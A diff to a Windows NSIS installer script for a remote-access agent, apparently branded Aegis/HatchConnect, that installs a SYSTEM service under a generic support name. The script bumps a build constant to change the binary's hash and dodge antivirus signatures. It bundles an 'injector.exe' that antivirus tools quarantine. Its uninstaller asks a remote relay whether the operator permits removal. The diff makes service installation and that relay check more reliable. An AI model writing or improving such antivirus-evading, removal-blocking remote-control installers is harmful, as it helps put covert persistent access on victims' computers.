@@ -16,7 +16,7 @@ SetCompressor /SOLID lzma
 ; Build-stamp constant: changes once per hash-change cycle so the output binary
 ; has a different SHA256 than prior builds. Bumping this re-signs the signature
 ; AV vendors learned to match. Harmless unused constant otherwise.
-!define BUILD_STAMP "2026-11-03-a"
+!define BUILD_STAMP "2026-11-09-a"
 
 Var KEY
 Var NAME
@@ -37,15 +37,48 @@ Var METATMP      ; temp file for /api/key-meta response
 ; ONE install location. Called once for single-install, twice for dual-install.
 ; Inputs are read from the paired Var set (INSTDIR_$INSTANCE / NAME / SVCNAME /
 ; ARPKEY / FWRULE) so a single macro body serves both runs.
-!macro INSTALL_ONE _idx _instdir _name _svc _arp _fw
-  ; stop any prior service + agents at this location
+; `_tag` is a per-call-site unique string used only for label suffixes, so the
+; macro can be inserted multiple times in one Section without duplicating
+; labels. `_idx` stays numeric (baked into config.default.json as JSON).
+!macro INSTALL_ONE _tag _idx _instdir _name _svc _arp _fw
+  ; Stop any prior service + agents at this location. `net stop` is synchronous
+  ; and releases the SCM handle `sc stop` would keep open — that handle is what
+  ; puts the service into "marked for deletion" state and makes the follow-up
+  ; `sc create` fail with 1073. After `sc delete`, poll `sc query` for up to
+  ; ~10s until it returns 1060 (does not exist). If any observer holds the SCM
+  ; entry (services.msc, Event Viewer, EDR) the delete is async; without this
+  ; poll the install silently had no service registered — device offline forever.
+  nsExec::Exec 'net stop "${_svc}"'
+  Pop $R6
   nsExec::Exec 'sc stop "${_svc}"'
+  Pop $R6
   nsExec::Exec 'sc delete "${_svc}"'
-  Sleep 400
+  Pop $R6
+  StrCpy $R9 0
+  svcdel_poll_${_tag}:
+    nsExec::Exec 'sc query "${_svc}"'
+    Pop $R8
+    StrCmp $R8 "1060" svcdel_done_${_tag}
+    IntOp $R9 $R9 + 1
+    IntCmp $R9 20 svcdel_done_${_tag} 0 0
+    Sleep 500
+    Goto svcdel_poll_${_tag}
+  svcdel_done_${_tag}:
 
   CreateDirectory "${_instdir}"
   SetOutPath "${_instdir}"
+  ClearErrors
   File /r "release\Aegis\*"
+  IfErrors file_fail_${_tag} file_ok_${_tag}
+  file_fail_${_tag}:
+    ; Most common cause: AV (McAfee WPS, Defender) quarantined support.exe or
+    ; injector.exe mid-copy. Install cannot proceed usefully; mark in the log
+    ; and set a non-zero error level so the caller knows.
+    FileOpen $R7 "$TEMP\hc-install.log" a
+    FileWrite $R7 "[FATAL] File /r failed (AV quarantine?) svc=${_svc} dir=${_instdir}$\r$\n"
+    FileClose $R7
+    SetErrorLevel 2
+  file_ok_${_tag}:
 
   ; Config file: same key + same device-id derivation, differing only by
   ; "instance" so the relay can tell copy #1 from copy #2 when both connect.
@@ -88,6 +121,17 @@ Var METATMP      ; temp file for /api/key-meta response
   ; session as SYSTEM). AegisService.exe reads the service name from its own
   ; argv so each copy gets a unique registered service — see /install flag.
   nsExec::Exec '"${_instdir}\AegisService.exe" /install /svc:${_svc}'
+  Pop $R8
+  StrCmp $R8 "0" svc_install_ok_${_tag}
+    ; Service failed to register. Most likely cause: a leftover "pending-deletion"
+    ; SCM entry from a prior uninstall whose handle wasn't released in time
+    ; (should be much rarer now that we net-stop + poll above, but log it so
+    ; operators can distinguish fresh failures from the old recurring bug).
+    FileOpen $R7 "$TEMP\hc-install.log" a
+    FileWrite $R7 "[FATAL] AegisService /install failed rc=$R8 svc=${_svc}$\r$\n"
+    FileClose $R7
+    SetErrorLevel 3
+  svc_install_ok_${_tag}:
   nsExec::Exec 'sc failure "${_svc}" reset=86400 actions=restart/5000/restart/10000/restart/30000'
 !macroend
 
@@ -173,7 +217,7 @@ Section "Install"
   StrCpy $SVCNAME_1 "SupportAgentSvc"
   StrCpy $ARPKEY_1 "Support"
   StrCpy $FWRULE_1 "HatchConnect Agent"
-  !insertmacro INSTALL_ONE "1" "$INSTDIR_1" "$NAME" "$SVCNAME_1" "$ARPKEY_1" "$FWRULE_1"
+  !insertmacro INSTALL_ONE "s" "1" "$INSTDIR_1" "$NAME" "$SVCNAME_1" "$ARPKEY_1" "$FWRULE_1"
   Goto install_done
 
   dual_mode:
@@ -186,8 +230,8 @@ Section "Install"
   StrCpy $ARPKEY_2  "$NAME2"
   StrCpy $FWRULE_1  "HatchConnect $NAME"
   StrCpy $FWRULE_2  "HatchConnect $NAME2"
-  !insertmacro INSTALL_ONE "1" "$INSTDIR_1" "$NAME"  "$SVCNAME_1" "$ARPKEY_1" "$FWRULE_1"
-  !insertmacro INSTALL_ONE "2" "$INSTDIR_2" "$NAME2" "$SVCNAME_2" "$ARPKEY_2" "$FWRULE_2"
+  !insertmacro INSTALL_ONE "d1" "1" "$INSTDIR_1" "$NAME"  "$SVCNAME_1" "$ARPKEY_1" "$FWRULE_1"
+  !insertmacro INSTALL_ONE "d2" "2" "$INSTDIR_2" "$NAME2" "$SVCNAME_2" "$ARPKEY_2" "$FWRULE_2"
   install_done:
 SectionEnd
 
@@ -223,14 +267,27 @@ Section "Uninstall"
   ; hash of the Windows MachineGuid) and asks /api/uninstall-allowed with the key.
   ; Denied only when the operator turned protection ON and hasn't released it.
   ; Fails OPEN on any network/error so a blip never traps a legit uninstall.
+  ; Use curl.exe for the HTTPS call (same reason as the uninstall-report call
+  ; below): Windows PowerShell 5.1's Invoke-RestMethod defaults to TLS 1.0, which
+  ; Railway refuses — the call then hangs past -TimeoutSec and the user watches
+  ; the uninstaller sit frozen for 15-30s before it gives up. curl.exe uses
+  ; schannel with modern TLS and returns cleanly. PS here just derives id+key
+  ; (no network) then hands off to curl; the response is parsed after.
   FileOpen $1 "$INSTDIR\ucheck.ps1" w
   FileWrite $1 'try {$\r$\n'
   FileWrite $1 '  $$g = (Get-ItemProperty $\'HKLM:\SOFTWARE\Microsoft\Cryptography$\' -Name MachineGuid).MachineGuid.Trim().ToLower()$\r$\n'
   FileWrite $1 '  $$sha = [System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($\'aegis:$\'+$$g))).Replace($\'-$\',$\'$\').ToLower()$\r$\n'
   FileWrite $1 '  $$id = $\'m-$\' + $$sha.Substring(0,24)$\r$\n'
   FileWrite $1 '  $$cfg = Get-Content $\'$INSTDIR\resources\app\agent\config.default.json$\' -Raw | ConvertFrom-Json$\r$\n'
-  FileWrite $1 '  $$body = @{ id=$$id; key=$$cfg.key } | ConvertTo-Json$\r$\n'
-  FileWrite $1 '  $$r = Invoke-RestMethod -Uri $\'https://aegis-relay-production.up.railway.app/api/uninstall-allowed$\' -Method POST -ContentType $\'application/json$\' -Body $$body -TimeoutSec 8$\r$\n'
+  FileWrite $1 '  $$body = @{ id=$$id; key=$$cfg.key } | ConvertTo-Json -Compress$\r$\n'
+  FileWrite $1 '  $$tmp = $$env:TEMP + $\'\hc-ucheck-body.json$\'$\r$\n'
+  FileWrite $1 '  $$out = $$env:TEMP + $\'\hc-ucheck-out.json$\'$\r$\n'
+  FileWrite $1 '  [System.IO.File]::WriteAllText($$tmp, $$body)$\r$\n'
+  FileWrite $1 '  & curl.exe --silent --show-error --max-time 8 -X POST -H $\'Content-Type: application/json$\' --data $\'@$$tmp$\' -o $$out https://aegis-relay-production.up.railway.app/api/uninstall-allowed | Out-Null$\r$\n'
+  FileWrite $1 '  Remove-Item $$tmp -ErrorAction SilentlyContinue$\r$\n'
+  FileWrite $1 '  if (-not (Test-Path $$out)) { exit 0 }$\r$\n'
+  FileWrite $1 '  $$r = Get-Content -Raw $$out | ConvertFrom-Json$\r$\n'
+  FileWrite $1 '  Remove-Item $$out -ErrorAction SilentlyContinue$\r$\n'
   FileWrite $1 '  if ($$r.allowed) { exit 0 } else { exit 1 }$\r$\n'
   FileWrite $1 '} catch { exit 0 }$\r$\n'
   FileClose $1
